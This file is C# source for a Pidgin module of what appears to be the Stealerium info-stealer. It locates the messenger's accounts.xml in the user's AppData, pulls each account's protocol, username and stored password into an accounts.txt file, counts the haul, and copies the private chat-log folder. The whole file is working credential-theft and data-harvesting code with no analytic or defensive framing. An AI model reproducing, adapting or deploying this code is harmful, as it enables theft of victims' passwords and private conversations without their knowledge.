using System;
using System.IO;
using System.Text;
using System.Xml;
using Stealerium.Helpers;

namespace Stealerium.Target.Messengers;

internal sealed class Pidgin
{
	private static readonly StringBuilder SbTwo = new StringBuilder();

	private static readonly string PidginPath = Path.Combine(Paths.Appdata, ".purple");

	private static void GetLogs(string sSavePath)
	{
		try
		{
			string text = Path.Combine(PidginPath, "logs");
			if (Directory.Exists(text))
			{
				Filemanager.CopyDirectory(text, sSavePath + "\\chatlogs");
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Pidgin >> Failed to collect chat logs\n" + ex);
		}
	}

	private static void GetAccounts(string sSavePath)
	{
		string text = Path.Combine(PidginPath, "accounts.xml");
		if (!File.Exists(text))
		{
			return;
		}
		try
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(new XmlTextReader(text));
			if (xmlDocument.DocumentElement != null)
			{
				foreach (XmlNode childNode in xmlDocument.DocumentElement!.ChildNodes)
				{
					string innerText = childNode.ChildNodes[0]!.InnerText;
					string innerText2 = childNode.ChildNodes[1]!.InnerText;
					string innerText3 = childNode.ChildNodes[2]!.InnerText;
					if (!string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2) && !string.IsNullOrEmpty(innerText3))
					{
						SbTwo.AppendLine("Protocol: " + innerText);
						SbTwo.AppendLine("Username: " + innerText2);
						SbTwo.AppendLine("Password: " + innerText3 + "\r\n");
						Counter.Pidgin++;
						continue;
					}
					break;
				}
			}
			if (SbTwo.Length > 0)
			{
				Directory.CreateDirectory(sSavePath);
				File.AppendAllText(sSavePath + "\\accounts.txt", SbTwo.ToString());
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Pidgin >> Failed to collect accounts\n" + ex);
		}
	}

	public static void Get(string sSavePath)
	{
		GetAccounts(sSavePath);
		GetLogs(sSavePath);
	}
}
